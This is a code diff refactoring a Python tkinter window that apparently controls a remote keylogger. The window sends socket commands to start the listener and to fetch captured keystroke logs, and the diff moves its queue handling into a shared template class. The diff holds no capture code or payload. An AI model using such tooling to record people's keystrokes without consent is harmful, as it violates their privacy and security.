@@ -2,15 +2,12 @@ import tkinter as tk
 import tkinter.scrolledtext as st
 import ui.label as lb
 import ui.constraints as const
-from tkinter.messagebox import showerror, showinfo, askokcancel
-import queue
+import ui.ui_template as tpl
 
-class UI_keylogger(tk.Toplevel):
+from services.count import Count
+class UI_keylogger(tpl.UI_ToplevelTemplate):
     def __init__(self, parent, socket_queue, ui_queues):
-        super().__init__(parent)
-        self.ui_queue = queue.Queue()
-        self.socket_queue = socket_queue
-        ui_queues['keyboard'] = self.ui_queue
+        super().__init__(parent, 'keyboard', socket_queue, ui_queues)
 
         self.title = lb.KEYLOGGER_TITLE
         self.protocol("WM_DELETE_WINDOW", self.close)
@@ -36,8 +33,8 @@ class UI_keylogger(tk.Toplevel):
         self.text_log.grid(row = 2, column = 0, columnspan = 2, pady = (5,0))
         self.text_log['state'] = 'disabled'
 
+        self.update_counter = Count(2, self.socket_cmd, 'listener-get')
         self.socket_cmd("listener-start")
-        self.after(const.UPDATE_TIME, self.periodic_call)
 
     def handle_return(self, event):
         if self.focus_get() == self.btn_hook:
@@ -80,7 +77,6 @@ class UI_keylogger(tk.Toplevel):
         self.destroy()
 
     def update_ui(self, task):
-        DEBUG("task", task)
         cmd, ext = task
 
         if cmd == "update-log":
@@ -91,20 +87,6 @@ class UI_keylogger(tk.Toplevel):
 
     def periodic_call(self):
         if self.btn_hook_stt.get() == lb.KEYLOGGER_UNHOOK:
-            self.socket_cmd("listener-get")
+            self.update_counter.count_up()
 
-        while True:
-            try:
-                task = self.ui_queue.get_nowait()
-                self.update_ui(task)
-                
-            except queue.Empty:
-                break
-        
-        self.after(const.UPDATE_TIME, self.periodic_call)
-    
-    def socket_cmd(self, cmd, ext = None):
-        self.socket_queue.put((cmd, ext))
-
-def DEBUG(*args,**kwargs):
-    print("UI:", *args,**kwargs)
+        super().periodic_call()
